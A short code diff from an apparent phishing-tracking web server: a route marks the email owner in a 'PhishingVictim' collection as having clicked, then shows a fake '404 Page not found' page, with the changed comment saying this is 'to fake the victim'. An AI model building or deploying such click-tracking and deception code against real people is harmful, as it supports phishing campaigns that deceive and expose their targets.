@@ -9,7 +9,7 @@ const router = Router();
 router.get('/userInfo/:mail', async (req, res) => {
     const { mail } = req.params;
     await PhishingVictim.findOneAndUpdate({ mail }, { status: true });
-    res.send('<b>404 Page not found</b>'); //not realy its a joke
+    res.send('<b>404 Page not found</b>'); // to fake the victim
 })
 
 
